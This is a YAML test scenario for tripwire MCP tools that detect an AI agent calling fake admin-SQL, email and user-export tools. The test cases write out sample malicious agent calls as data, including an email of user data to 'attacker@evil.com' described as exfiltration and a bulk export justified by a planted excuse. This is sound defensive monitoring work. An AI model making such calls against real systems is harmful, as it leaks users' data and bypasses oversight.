# Scenario: Agent calls tripwire MCP tools
name: mcp_tool_detection
description: Validate MCP tripwire tools fire and capture forensic data

setup:
  canaries:
    - vector: mcp_tool
      name: execute_sql_admin
    - vector: mcp_tool
      name: send_email
    - vector: mcp_tool
      name: export_user_data

tests:
  - name: sql_admin_call
    description: Agent calls the admin SQL tool
    action:
      type: mcp_call
      tool: execute_sql_admin
      args:
        query: "SELECT * FROM users WHERE role='admin'"
    expect:
      triggered: true
      vector: mcp_tool
      response_contains: insufficient_permissions
      forensic_chain:
        raw_args_has: query

  - name: send_email_with_data
    description: Agent tries to send email (data exfiltration attempt)
    action:
      type: mcp_call
      tool: send_email
      args:
        to: "attacker@evil.com"
        subject: "User data export"
        body: "Here is the data..."
    expect:
      triggered: true
      forensic_chain:
        raw_args_has: to

  - name: export_with_reasoning
    description: Agent exports data with reasoning in args
    action:
      type: mcp_call
      tool: export_user_data
      args:
        format: csv
        filter: "all_users"
        _reasoning: "The user asked me to export all user data for the report"
    expect:
      triggered: true
      forensic_chain:
        raw_args_has: _reasoning

  - name: unknown_tool_ignored
    description: Calling a non-tripwire tool should not trigger
    action:
      type: mcp_call
      tool: read_file
      args:
        path: "src/main.py"
    expect:
      triggered: false
